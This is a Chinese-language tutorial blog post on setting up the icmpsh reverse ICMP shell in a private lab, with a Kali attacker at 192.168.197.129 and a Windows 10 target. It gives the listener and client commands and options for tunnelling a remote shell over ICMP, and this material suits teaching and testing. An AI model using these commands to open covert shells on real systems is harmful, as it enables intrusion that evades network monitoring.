---
title: 【隧道代理】icmpsh工具的使用
date: 2025-09-10
categories:
  - 内网攻防
image: images/59.webp
---
# icmpsh工具
```
icmpsh是⼀个简单的反向ICMP shell⼯具。与其他类似的开源⼯具相⽐，主要优势在于它不需要管理权限即可在⽬标机器上运⾏。 
客户端只能在Windows机器运⾏，服务端可以在任何平台上运⾏。
```
## 下载地址
```
https://github.com/bdamele/icmpsh
```
## 本地实验环境
**kali攻击机： 192.168.197.129**
**win10靶机：192.168.197.138**
## 服务端
1.关闭icmp回复,如果要开启icmp回复，该值设置为0  因为icmpsh工具要代替系统本身的icmp应答程序，所以需要提前关闭本地系统的icmp应答，否则Shell的运行会不稳定
```
关闭icmp回复
sysctl -w net.ipv4.icmp_echo_ignore_all=1
开启icmp回复
sysctl -w net.ipv4.icmp_echo_ignore_all=0
```
![image.png](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250910155900.png)
2.安装get-pip.py
```
wget https://bootstrap.pypa.io/pip/2.7/get-pip.py
python2 get-pip.py
```
![image.png](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250910161525.png)
3.安装impacket
```
这里我是下载完成后，上传到我的kali里进行安装
https://github.com/fortra/impacket/releases/tag/impacket_0_11_0
python2 setup.py install
或者：
# 安装兼容 Python 2 的 Impacket 版本（0.9.22 及以下）
pip2 install impacket==0.9.22
```
![image.png](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250910162903.png)
运行，第⼀个IP是VPS的eth0网卡IP，第二个IP是目标机器出口的公网IP
```
python2 icmpsh_m.py 192.168.197.129 192.168.197.138
```
![image.png](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250910162813.png)
## 客户端
```
icmpsh.exe -t 192.168.197.129 -d 500 -b 30 -s 128

-t 主机ip地址以发送ping请求。这个选项是强制性的！
-r 发送⼀个包含字符串“Test1234”的测试icmp请求，然后退出。
-d 毫秒请求之间的延迟（毫秒）
-o 毫秒响应超时（毫秒）。如果没有及时收到回复，从机将增加空⽩计数器。如果该计数器达到某个极限，从机将退出。
如果收到响应，计数器将设置回0。
-b 空⽩数量限制（退出前未答复的icmp请求）
-s 字节最⼤数据缓冲区⼤⼩（字节）
```
![image.png](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250910162737.png)
**成功shell**
![image.png](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250910162753.png)
